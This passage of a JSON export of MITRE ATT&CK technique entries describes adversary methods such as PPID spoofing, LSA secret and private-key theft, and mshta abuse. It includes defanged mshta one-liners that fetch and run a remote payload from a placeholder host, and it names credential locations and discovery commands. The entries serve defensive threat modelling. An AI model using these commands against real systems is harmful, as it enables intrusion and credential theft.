use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\\n\\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\\n\\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)\", \"modified\": \"2020-04-16T19:37:02.030Z\", \"id\": \"attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a\"}, \"attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-10-01T00:36:30.759Z\", \"name\": \"Compromise Infrastructure\", \"attack_pattern_identifier\": \"T1584\", \"description\": \"Before compromising a victim, adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\\n\\nUse of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)\", \"modified\": \"2020-10-22T18:03:23.937Z\", \"id\": \"attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9\"}, \"attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:20.537Z\", \"name\": \"Data from Local System\", \"attack_pattern_identifier\": \"T1005\", \"modified\": \"2020-05-26T19:21:25.974Z\", \"description\": \"Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.\\n\\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\\n\", \"id\": \"attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5\"}, \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-01-10T16:03:18.865Z\", \"name\": \"Create or Modify System Process\", \"attack_pattern_identifier\": \"T1543\", \"description\": \"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. (Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \\n\\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \\n\\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. (Citation: OSX Malware Detection).  \", \"modified\": \"2020-10-09T13:46:29.922Z\", \"id\": \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\"}, \"attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-10T18:33:36.159Z\", \"name\": \"Service Execution\", \"attack_pattern_identifier\": \"T1569.002\", \"modified\": \"2020-03-28T18:52:02.384Z\", \"description\": \"Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\\n\\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals)\\n\\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.\", \"id\": \"attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4\"}, \"attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-16T15:45:17.032Z\", \"name\": \"Symmetric Cryptography\", \"attack_pattern_identifier\": \"T1573.001\", \"description\": \"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.\", \"modified\": \"2020-03-26T21:25:37.306Z\", \"id\": \"attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41\"}, \"attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:23.195Z\", \"name\": \"Two-Factor Authentication Interception\", \"attack_pattern_identifier\": \"T1111\", \"modified\": \"2020-03-25T20:35:21.672Z\", \"description\": \"Adversaries may target two-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources. Use of two or multi-factor authentication (2FA or MFA) is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \\n\\nIf a smart card is used for two-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\\n\\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\\n\\nOther methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)\", \"id\": \"attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49\"}, \"attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:34.523Z\", \"name\": \"Data Transfer Size Limits\", \"attack_pattern_identifier\": \"T1030\", \"description\": \"An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.\", \"modified\": \"2020-07-14T19:47:46.912Z\", \"id\": \"attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd\"}, \"attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-15T16:25:22.260Z\", \"name\": \"Rc.common\", \"attack_pattern_identifier\": \"T1037.004\", \"description\": \"Adversaries may use rc.common automatically executed at boot initialization to establish persistence. During the boot process, macOS executes <code>source /etc/rc.common</code>, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated mechanism in favor of [Launch Agent](https://attack.mitre.org/techniques/T1543/001) and [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) but is currently still used.\\n\\nAdversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user. (Citation: Methods of Mac Malware Persistence)\", \"modified\": \"2020-03-24T23:46:20.433Z\", \"id\": \"attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211\"}, \"attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T21:15:06.561Z\", \"name\": \"Domain Groups\", \"attack_pattern_identifier\": \"T1069.002\", \"description\": \"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\\n\\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.\", \"modified\": \"2020-03-12T19:07:53.043Z\", \"id\": \"attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c\"}, \"attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-20T21:08:52.529Z\", \"name\": \"Archive via Library\", \"attack_pattern_identifier\": \"T1560.002\", \"description\": \"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.\\n\\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.\", \"modified\": \"2020-03-29T18:27:30.891Z\", \"id\": \"attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6\"}, \"attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-02T14:22:24.410Z\", \"name\": \"Stored Data Manipulation\", \"attack_pattern_identifier\": \"T1565.001\", \"description\": \"Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\\n\\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\", \"modified\": \"2020-03-02T15:17:40.505Z\", \"id\": \"attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292\"}, \"attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-14T01:27:31.344Z\", \"name\": \"Portable Executable Injection\", \"attack_pattern_identifier\": \"T1055.002\", \"description\": \"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \\n\\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Endgame Process Injection July 2017) \\n\\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. \", \"modified\": \"2020-06-20T22:19:58.813Z\", \"id\": \"attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662\"}, \"attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-19T18:52:24.547Z\", \"name\": \"Remote Email Collection\", \"attack_pattern_identifier\": \"T1114.002\", \"modified\": \"2020-02-19T20:53:50.908Z\", \"description\": \"Adversaries may target an Exchange server or Office 365 to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.\", \"id\": \"attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a\"}, \"attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-11T14:43:31.706Z\", \"name\": \"Malicious Link\", \"attack_pattern_identifier\": \"T1204.001\", \"modified\": \"2020-03-11T14:43:31.706Z\", \"description\": \"An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).\", \"id\": \"attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9\"}, \"attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Data from Information Repositories\", \"attack_pattern_identifier\": \"T1213\", \"description\": \"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\\n\\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\\n\\n* Policies, procedures, and standards\\n* Physical / logical network diagrams\\n* System architecture diagrams\\n* Technical system documentation\\n* Testing / development credentials\\n* Work / project schedules\\n* Source code snippets\\n* Links to network shares and other internal resources\\n\\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include [Sharepoint](https://attack.mitre.org/techniques/T1213/002), [Confluence](https://attack.mitre.org/techniques/T1213/001), and enterprise databases such as SQL Server.\", \"modified\": \"2020-10-12T12:16:55.085Z\", \"id\": \"attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416\"}, \"attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T16:22:09.493Z\", \"name\": \"LSA Secrets\", \"attack_pattern_identifier\": \"T1003.004\", \"description\": \"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\\\SECURITY\\\\Policy\\\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\\n\\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)\", \"modified\": \"2020-03-24T20:35:42.440Z\", \"id\": \"attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc\"}, \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:12:31.196Z\", \"name\": \"Windows Command Shell\", \"attack_pattern_identifier\": \"T1059.003\", \"modified\": \"2020-03-28T17:02:13.722Z\", \"description\": \"Adversaries may abuse the Windows command shell for execution. The Windows command shell (<code>cmd.exe</code>) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. \\n\\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\\n\\nAdversaries may leverage <code>cmd.exe</code> to execute various commands and payloads. Common uses include <code>cmd.exe /c</code> to execute a single command, or abusing <code>cmd.exe</code> interactively with input and output forwarded over a command and control channel.\", \"id\": \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\"}, \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:35.733Z\", \"name\": \"System Owner/User Discovery\", \"attack_pattern_identifier\": \"T1033\", \"modified\": \"2020-03-15T01:03:47.866Z\", \"description\": \"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nUtilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.\", \"id\": \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\"}, \"attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-06T21:11:11.225Z\", \"name\": \"Time Based Evasion\", \"attack_pattern_identifier\": \"T1497.003\", \"modified\": \"2020-07-01T16:32:02.532Z\", \"description\": \"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\\n\\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny. \", \"id\": \"attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0\"}, \"attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-31T12:39:18.816Z\", \"name\": \"Network Share Connection Removal\", \"attack_pattern_identifier\": \"T1070.005\", \"description\": \"Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\\\\\system\\\\share /delete</code> command. (Citation: Technet Net Use)\", \"modified\": \"2020-01-31T12:39:18.816Z\", \"id\": \"attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c\"}, \"attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:25.454Z\", \"name\": \"Email Collection\", \"attack_pattern_identifier\": \"T1114\", \"description\": \"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. \", \"modified\": \"2020-03-24T18:31:06.417Z\", \"id\": \"attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f\"}, \"attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-04T13:06:49.258Z\", \"name\": \"Private Keys\", \"attack_pattern_identifier\": \"T1552.004\", \"description\": \"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \\n\\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.\\n\\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\\n\\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.\", \"modified\": \"2020-03-29T21:36:36.613Z\", \"id\": \"attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf\"}, \"attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:23:26.059Z\", \"name\": \"Remote Desktop Protocol\", \"attack_pattern_identifier\": \"T1021.001\", \"modified\": \"2020-02-25T19:23:34.204Z\", \"description\": \"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\\n\\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \\n\\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) technique for Persistence.(Citation: Alperovitch Malware)\", \"id\": \"attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf\"}, \"attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Password Policy Discovery\", \"attack_pattern_identifier\": \"T1201\", \"description\": \"Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\\n\\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>.(Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)\", \"modified\": \"2020-09-29T14:48:07.227Z\", \"id\": \"attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5\"}, \"attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-23T19:32:49.557Z\", \"name\": \"Mshta\", \"attack_pattern_identifier\": \"T1218.005\", \"description\": \"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \\n\\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\\n\\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\\\"GetObject(\\\"\\\"script:https[:]//webserver/payload[.]sct\\\"\\\")\\\"))</code>\\n\\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\\n\\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)\", \"modified\": \"2020-06-20T22:35:27.613Z\", \"id\": \"attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade\"}, \"attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-04T12:52:13.006Z\", \"name\": \"Credentials In Files\", \"attack_pattern_identifier\": \"T1552.001\", \"modified\": \"2020-03-25T18:30:10.630Z\", \"description\": \"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\\n\\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\\n\\nIn cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)\", \"id\": \"attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc\"}, \"attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-06-23T19:12:24.924Z\", \"name\": \"JavaScript/JScript\", \"attack_pattern_identifier\": \"T1059.007\", \"description\": \"Adversaries may abuse JavaScript and/or JScript for execution. JavaScript (JS) is a platform-agnostic scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\\n\\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\\n\\nAdversaries may abuse JavaScript / JScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\", \"modified\": \"2020-06-25T03:23:13.804Z\", \"id\": \"attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d\"}, \"attack-pattern--deb98323-e13f-4b0c-8d94-175379069062\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-05T14:17:46.686Z\", \"name\": \"Software Packing\", \"attack_pattern_identifier\": \"T1027.002\", \"description\": \"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \\n\\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  \", \"modified\": \"2020-02-05T20:05:41.548Z\", \"id\": \"attack-pattern--deb98323-e13f-4b0c-8d94-175379069062\"}, \"attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:55.471Z\", \"name\": \"Permission Groups Discovery\", \"attack_pattern_identifier\": \"T1069\", \"description\": \"Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\", \"modified\": \"2020-10-08T17:36:01.675Z\", \"id\": \"attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce\"}, \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-15T16:13:46.151Z\", \"name\": \"Web Protocols\", \"attack_pattern_identifier\": \"T1071.001\", \"description\": \"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, 